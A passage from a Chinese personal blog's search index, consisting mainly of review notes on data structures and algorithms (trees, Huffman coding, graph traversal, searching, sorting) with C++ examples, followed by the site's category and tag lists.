满二叉树每一层结点都达到了最大个数的二叉树。深度为k的满二叉树有$2^k-1$个。 完全二叉树若设二叉树的深度为 k，则共有 k 层。除第 k 层外，其它各层 (1—k-1) 的结点数都达到最大个数，第k层从右向左连续缺若干结点，这就是完全二叉树。（区分非完全二叉树） 二叉树的存储表示顺序存储完全二叉树 非完全二叉树 问：顺序存储后能否复原成唯一对应的二叉树形状？ 答：若是完全/满二叉树则可以做到唯一复原。 因为根据性质5：可知结点i，左孩子的下标值必为2i， 其右孩子的下标值必为2i＋1. 非完全二叉树要将各层空缺处统统补上“虚结点”，其内容为空。 链表存储二叉树结点定义： 含n个结点的二叉链表其中空指针域为n+1个，非空指针域为n-1个。 二叉树遍历==二叉树的遍历就是按某种次序访问树中的结点，要求每个结点访问一次且仅访问一次。== 二叉树遍历的递归算法对根的访问时机不同，有三种实现方案： 123VLR（前序）LVR（中序）LRV（后序） 前序遍历二叉树 若二叉树为空，则 空操作；否则 (1) 访问根结点； (2) 先序遍历左子树； (3) 先序遍历右子树。 中序遍历二叉树 若二叉树为空， 则空操作；否则 (1) 中序遍历 左子树； (2) 访问根结点； (3) 中序遍历右子树。 后序遍历二叉树 若二叉树为空，则 空操作；否则 (1) 后序遍历 左子树； (2) 后序遍历 右子树； (3) 访问根结点 12345678910//前序遍历void preOrder(BiTree T)&#123; if(T)&#123; cout &lt;&lt; T-&gt;data &lt;&lt; endl; preOrder(T-&gt;lchild); preOrder(T-&gt;rchild); &#125;&#125;//中序和后序看访问的次序 二叉树算法设计练习 1234567891011121314151617181920212223//二叉树算法设计练习//设计算法按前序次序打印二叉树中的叶子结点。void PreOrder(BiNode *root)&#123; if (root == NULL) return; else &#123; if (root-&gt;lchild ==NULL &amp;&amp; root-&gt;rchild==NULL) cout&lt;&lt;root-&gt;data; PreOrder(root-&gt;lchild); PreOrder(root-&gt;rchild); &#125;&#125;//设计算法求二叉树中叶子结点个数int CountLeaf (BiNode * T)&#123;// 先序遍历二叉树，以 count 返回二叉树中叶子结点数 if ( T ==null) return 0; else if ((!T-&gt;Lchild)&amp;&amp; (!T-&gt;Rchild))return 1; else&#123; int a=CountLeaf( T-&gt;Lchild); int b = CountLeaf( T-&gt;Rchild); return a+b; &#125; &#125; 二叉树遍历的非递归算法前序遍历 中序遍历 层次序遍历 1234567891011121314template &lt;class T&gt;void BinaryTree&lt;T&gt;::levelOrder (void (*visit) (BinTreeNode&lt;T&gt; *t)) &#123; if (root == NULL) return; Queue&lt;BinTreeNode&lt;T&gt; * &gt; Q; BinTreeNode&lt;T&gt; *p = root; Q.EnQueue (p); while (!Q.IsEmpty ()) &#123; Q.DeQueue (p); visit(p); if (p-&gt;leftChild != NULL) Q.EnQueue (p-&gt;leftChild); if (p-&gt;rightChild != NULL) Q.EnQueue (p-&gt;rightChild); &#125; &#125;; 二叉树的计数由先序序列确定根结点，再由中序序列找出左右子树，可唯一确定一棵二叉树！ 树和森林树的存储表示：树会转换成二叉树，通常用左子女，右兄弟来表示。 森林和二叉树的转换森林转换为二叉树 将森林中的每棵树转换成二叉树； 从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵二叉树根结点的右孩子，当所有二叉树连起来后，此时所得到的二叉树就是由森林转换得到的二叉树。 树与和森林的遍历深度优先遍历 森林和树一样。 广度优先遍历森林的层次序遍历： 依次遍历各棵树的根节点； 依次遍历各棵树根节点的所有子女； 哈夫曼树路径长度路径长度：两个结点之间的路径长度 PL 是连接两结点的路径上的分支数。 树的路径长度：从树根到每一结点的路径长度之和。 树的带权路径长度：设树具有n个带权值的叶子结点，从根结点到各个叶子结点的路径长度与相应叶子结点权值的乘积之和。 记为： $WPL=\\sum_{k=1}^nW_kL_k$ 哈夫曼树带权路径长度达到最小的扩充二叉树为哈夫曼树。 特点为： 权值越大的叶子结点越靠近根结点，而权值越小的叶子结点越远离根结点。 只有度为0（叶子结点）和度为2（分支结点）的结点，不存在度为1的结点。 若哈夫曼树有n个叶节点，则总结点为2n-1个。 哈夫曼编码哈夫曼编码用哈夫曼编码树来表示（左零右一）。 哈夫曼编码结果：$WPL=1bit7+2bit5+3bit6=35bit$ 基本思想：概率大的字符用短码，概率小的用长码。 练习：假设用于通信的电文仅由8个字母 {a, b, c, d, e, f, g, h} 构成，它们在电文中出现的概率分别为{ 0.07, 0.19, 0.02, 0.06, 0.32, 0.03, 0.21, 0.10}，试为这8个字母设计哈夫曼编码。如果用0～7的二进制编码方案又如何？ 一般左面是小数，右面是大数。 $WPL＝2(0.19+0.32+0.21) + 4(0.07+0.06+0.10) +5(0.02+0.03) =1.44+0.92+0.25=2.61 $ 堆最小堆：任一结点的关键码均小于或等于它的左右子女的关键码，位于堆顶的结点的关键码是集合中最小的，所以称为最小堆。 最小堆的形成 图图的基本概念有向图：图G中的每条边都是有方向的； 无向图：图G中的每条边都是无方向的； 完全图 ：图G任意两个顶点都有一条边相连接；若有 n 个顶点的无向图有 n(n-1)/2 条边, 则此图为完全无向图。有 n 个顶点的有向图有n(n-1) 条边, 则此图为完全有向图。 顶点的度：一个顶点v的度是与它相关联的边的条数。 连通图与连通分量 ：在无向图中, 若从顶点v1到顶点v2有路径, 则称顶点v1与v2是连通的。如果图中任意一对顶点都是连通的, 则称此图是连通图。非连通图的极大连通子图叫做连通分量。 ==这里要分清两个概念：极大连通子图（连通分量）和极小连通子图（生成树）== 极大连通子图 连通图只有一个极大连通子图，就是它本身 非连通图的极大连通子图就叫连通分量，每个分量都是一个连通图。 极小连通子图 一个连通图的生成树就是极小连通子图，并且极小联通子图只存在于连通图中。 最明显的特点是n个结点，n-1条边。 强连通图与强连通分量 ：在有向图中, 若对于每一对顶点vi和vj, 都存在一条从vi到vj和从vj到vi的路径, 则称此图是强连通图。非强连通图的极大强连通子图叫做强连通分量。 生成树 ：一个连通图的生成树是其极小连通子图，在 n 个顶点的情形下，有 n-1 条边。 图的存储结构邻接矩阵表示 特点：完全图的邻接矩阵中，对角元素全为0，其余全为1。 网络的邻接矩阵 邻接矩阵法优点： 容易实现图的操作，如：求某顶点的度、判断顶点之间是否有边（弧）、找顶点的邻接点等等。 邻接矩阵法缺点： n个顶点需要n*n个单元存储边(弧);空间效率为O(n2)。 对稀疏图而言尤其浪费空间。 邻接表表示 特点：若图中有n个顶点，a条边 无向图中，用邻接表表示，需要n个顶点结点，2a个边结点。 有向图中，用邻接表表示，若不考虑逆邻接表，只需 n 个顶点结点，a 个边结点。 网络的邻接表 图的遍历深度优先遍历（DFS） 1234567891011121314151617181920212223//连通图的深度遍历 template&lt;class T, class E&gt; void DFS (Graph&lt;T, E&gt;&amp; G, int v, bool visited[]) &#123; cout &lt;&lt; G.getValue(v) &lt;&lt; ' '; //访问顶点v visited[v] = true; //作访问标记 int w = G.getFirstNeighbor (v); //第一个邻接顶点 while (w != -1) &#123; //若邻接顶点w存在 if ( !visited[w] ) DFS(G, w, visited); //若w未访问过, 递归访问顶点w w = G.getNextNeighbor (v, w); //下一个邻接顶点 &#125;&#125;//图的深度优先搜索算法 template&lt;class T, class E&gt; void DFSTraverse (Graph&lt;T, E&gt;&amp; G, const T&amp; v) &#123; //从顶点v出发对图G进行深度优先遍历的主过程 int i, loc, n = G.NumberOfVertices(); //顶点个数 bool *visited = new bool[n]; //创建辅助数组 for (i = 0; i &lt; n; i++) visited [i] = false; //辅助数组初始化 loc = G.getVertexPos(v); DFS (G, loc, visited); //从顶点0开始深度优先搜索 delete [] visited; //释放visited &#125; 广度优先遍历（BFS） 12345678910111213141516171819202122232425//图的广度优先搜索算法 template &lt;class T, class E&gt; void BFS (Graph&lt;T, E&gt;&amp; G, const T&amp; v) &#123; int i, w, n = G.NumberOfVertices(); //图中顶点个数 bool *visited = new bool[n]; for (i = 0; i &lt; n; i++) visited[i] = false; int loc = G.getVertexPos (v); //取顶点号 cout &lt;&lt; G.getValue (loc) &lt;&lt; ' '; //访问顶点v visited[loc] = true; //做已访问标记 Queue&lt;int&gt; Q; Q.EnQueue (loc); //顶点进队列, 实现分层访问 图的广度优先搜索算法 while (!Q.IsEmpty()) &#123; //循环, 访问所有结点 Q.DeQueue (loc); w = G.getFirstNeighbor (loc); //第一个邻接顶点 while (w != -1) &#123; //若邻接顶点w存在 if (!visited[w]) &#123; //若未访问过 cout &lt;&lt; G.getValue (w) &lt;&lt; ‘ ’; //访问 visited[w] = true; Q.EnQueue (w); //顶点w进队列 &#125; w = G.getNextNeighbor (loc, w); //找顶点loc的下一个邻接点 &#125; &#125; delete [] visited; &#125; 最小生成树 画出该图的DFS和BFS生成树 DFS： BFS： Prim算法特点：将顶点归并 Kruskal算法特点：将边归并 最短路径非负权值的单源最短路径Dijkstra算法 AOV网AOV网：在一个有向图中，用顶点表示活动，用有向边表示活动先后次序的执行。这种有向图叫做顶点表示活动的AOV网络。 拓扑排序：按照有向图给出的次序关系，将图中顶点排成一个线性序列，对于有向图中没有限定次序关系的顶点，则可以人为加上任意的次序关系。由此所得顶点的线性序列称为拓扑有序序列，构造有向图的一个拓扑序列的过程称为拓扑排序。 eg： 搜索折半搜索基本思想：折半搜索时, 先求位于搜索区间正中的对象的下标mid，用其关键码与给定值x比较:Element[mid].key == x，搜索成功；Element[mid].key &gt; x，把搜索区间缩小到表的前半部分，继续折半搜索；Element[mid].key &lt; x，把搜索区间缩小到表的后半部分，继续折半搜索。 12345678910111213141516171819202122232425int BinSearch1(int r[ ], int n, int k)&#123; //数组r[1] ~ r[n]存放查找集合 low = 1; high = n; while (low &lt;= high) &#123; mid = (low + high) / 2; if (k &lt; r[mid]) high = mid - 1; else if (k &gt; r[mid]) low = mid + 1; else return mid; &#125; return 0;&#125;int BinSearch2(int r[ ], int low, int high, int k)&#123; //数组r[1] ~ r[n]存放查找集合 if (low &gt; high) return 0; else &#123; mid = (low + high) / 2; if (k &lt; r[mid]) return BinSearch2(r, low, mid-1, k); else if (k &gt; r[mid]) return BinSearch2(r, mid+1, high, k); else return mid; &#125; &#125; 二叉搜索树定义：二叉搜索树是具有以下性质的二叉树 所有结点的关键码互不相同。 左子树（如果非空）上所有结点的关键码都小于根结点的关键码。 右子树（如果非空）上所有结点的关键码都大于根结点的关键码。 左子树和右子树也是二叉搜索树。 123456789//搜索算法template&lt;class E, class K&gt;BSTNode&lt;E, K&gt;* BST&lt;E, K&gt;:: Search (const K x, BSTNode&lt;E, K&gt; *ptr) &#123; if (ptr == NULL) return NULL; else if (x &lt; ptr-&gt;data) return Search(x, ptr-&gt;left); else if (x &gt; ptr-&gt;data) return Search(x, ptr-&gt;right); else return ptr; //搜索成功 &#125;; 二叉搜索树的插入12345678910111213//插入template &lt;class E, class K&gt;bool BST&lt;E, K&gt;::Insert (const E&amp; e1, BSTNode&lt;E, K&gt; *&amp; ptr) &#123; //注意参数形式 if (ptr == NULL) &#123; //新结点作为叶结点插入 ptr = new BstNode&lt;E, K&gt;(e1); //创建新结点 if (ptr == NULL)&#123; cerr &lt;&lt; \"Out of space\" &lt;&lt; endl; exit(1); &#125; return true; &#125; else if (e1 &lt; ptr-&gt;data) return Insert (e1, ptr-&gt;left); else if (e1 &gt; ptr-&gt;data) return Insert (e1, ptr-&gt;right); else return false; //x已在树中,不再插入&#125;; 二叉搜索树的删除有三种情况： 被删的结点是叶子 被删结点只有左子树或只有右子树 被删结点既有左子树又有右子树 排序 直接插入排序基本思想：在插入第 i（i＞1）个记录时，前面的 i-1个记录已经排好序。 平均情况下排序的时间复杂度为 o(n2)。直接插入排序是一种稳定的排序方法。 希尔排序基本思想：将整个待排序记录分割成若干个子序列，在子序列内分别进行直接插入排序，待整个序列中的记录基本有序时，对全体记录进行直接插入排序。 gap通常取： $gap=\\lfloor gap/3\\rfloor+1$ 希尔排序是一种不稳定的排序算法。 eg： 123456789101112131415161718//希尔排序的算法void Shellsort (dataList&lt;T&gt;&amp; L, const int left, const int right) &#123; int i, j, gap = right-left+1; //增量的初始值为待排序个数 Element&lt;T&gt; temp; do &#123; gap = gap/3+1; //求下一增量值 for(i=left+gap;i&lt;=right;i++) if (L[i]&lt;L[i-gap]) &#123;//逆序 temp=L[i]; j = i-gap; do &#123; L[j+gap] = L[j]; j= j-gap; &#125; while (j&gt;=left &amp;&amp; temp&lt;L[j]); L[j+gap]=temp; //将vector[i]回送 &#125; &#125; while (gap &gt; 1);&#125;; 冒泡排序基本思想：两两比较相邻记录的关键码，如果反序则交换，直到没有反序的记录为止。 1234567891011void BubbleSort (T V[], int n ) &#123; bool exchange ; int i , j ; for (i=1;i&lt;n;i++)&#123; exchange = false; //标志为0假定未交换 for (j=n-1;j&gt;= i；j--) if (V[j-1]&gt;V[j]) &#123; //逆序 T temp=V[j-1]; V[j-1]=V[j]; V[j]=temp//交换 exchange = true; //标志置为1,有交换 &#125;if(exchange==false) return; &#125; 快速排序基本思想：取待排序序列中一个元素作为基准，按照该元素的排序码的大小，将整个元素分为左右两个子序列，左侧都小于该排序码，右侧都大于。然后，重复实行这个方法，直到序列有序。 123456789101112131415161718192021222324//快速排序的算法template &lt;class T&gt;void QuickSort (dataList&lt;T&gt;&amp; L, int left, int right) &#123;//对Vector[left..right]进行排if (left &lt; right) &#123; //元素序列长度大于1时 int pivotpos = L.Partition (left, right); //划分 QuickSort (L, left, pivotpos-1); QuickSort (L, pivotpos+1, right); &#125;&#125;；int Partition( SqList &amp;L, int low, int high)&#123; L.r[0] = L.r[low]; pivitkey = L.r[low].key; while( low &lt; high)&#123; while( low &lt; high &amp;&amp; L.r[high].key &gt;= pivotkey) --high; L.r[low] = L.r[high]; while( low &lt; high &amp;&amp; L.r[low].key &lt;= pivotkey) ++low; L.r[high] = L.r[low]; &#125; L.r[low] = L.r[0]; return low;&#125; 快速排序是一种不稳定的排序算法 堆排序","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://pz1o.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"复习","slug":"复习","permalink":"https://pz1o.top/tags/%E5%A4%8D%E4%B9%A0/"},{"name":"数据结构","slug":"数据结构","permalink":"https://pz1o.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"我的第一篇博客","slug":"我的第一篇博客","date":"2020-06-27T14:56:15.000Z","updated":"2020-11-20T14:20:18.797Z","comments":true,"path":"2020/06/27/我的第一篇博客/","link":"","permalink":"https://pz1o.top/2020/06/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"2020/6/27 我的第一篇博客","categories":[],"tags":[]}],"categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"},{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"},{"name":"linux","slug":"linux","permalink":"https://pz1o.top/categories/linux/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/categories/wp/"},{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"},{"name":"计网","slug":"计网","permalink":"https://pz1o.top/categories/%E8%AE%A1%E7%BD%91/"},{"name":"Qt","slug":"Qt","permalink":"https://pz1o.top/categories/Qt/"},{"name":"复现","slug":"复现","permalink":"https://pz1o.top/categories/%E5%A4%8D%E7%8E%B0/"},{"name":"逆向","slug":"逆向","permalink":"https://pz1o.top/categories/%E9%80%86%E5%90%91/"},{"name":"笔记","slug":"笔记","permalink":"https://pz1o.top/categories/%E7%AC%94%E8%AE%B0/"},{"name":"BUU","slug":"BUU","permalink":"https://pz1o.top/categories/BUU/"},{"name":"开发","slug":"开发","permalink":"https://pz1o.top/categories/%E5%BC%80%E5%8F%91/"},{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/categories/Docker/"},{"name":"前端","slug":"前端","permalink":"https://pz1o.top/categories/%E5%89%8D%E7%AB%AF/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://pz1o.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"},{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"刷题","slug":"刷题","permalink":"https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"},{"name":"linux","slug":"linux","permalink":"https://pz1o.top/tags/linux/"},{"name":"堆","slug":"堆","permalink":"https://pz1o.top/tags/%E5%A0%86/"},{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"},{"name":"xss","slug":"xss","permalink":"https://pz1o.top/tags/xss/"},{"name":"计网","slug":"计网","permalink":"https://pz1o.top/tags/%E8%AE%A1%E7%BD%91/"},{"name":"文件包含","slug":"文件包含","permalink":"https://pz1o.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"Qt","slug":"Qt","permalink":"https://pz1o.top/tags/Qt/"},{"name":"实验","slug":"实验","permalink":"https://pz1o.top/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"复现","slug":"复现","permalink":"https://pz1o.top/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"逆向","slug":"逆向","permalink":"https://pz1o.top/tags/%E9%80%86%E5%90%91/"},{"name":"题解","slug":"题解","permalink":"https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"},{"name":"反弹shell","slug":"反弹shell","permalink":"https://pz1o.top/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"总结","slug":"总结","permalink":"https://pz1o.top/tags/%E6%80%BB%E7%BB%93/"},{"name":"开发","slug":"开发","permalink":"https://pz1o.top/tags/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"python","permalink":"https://pz1o.top/tags/python/"},{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/tags/Docker/"},{"name":"前端","slug":"前端","permalink":"https://pz1o.top/tags/%E5%89%8D%E7%AB%AF/"},{"name":"学习","slug":"学习","permalink":"https://pz1o.top/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"复习","slug":"复习","permalink":"https://pz1o.top/tags/%E5%A4%8D%E4%B9%A0/"},{"name":"数据结构","slug":"数据结构","permalink":"https://pz1o.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]}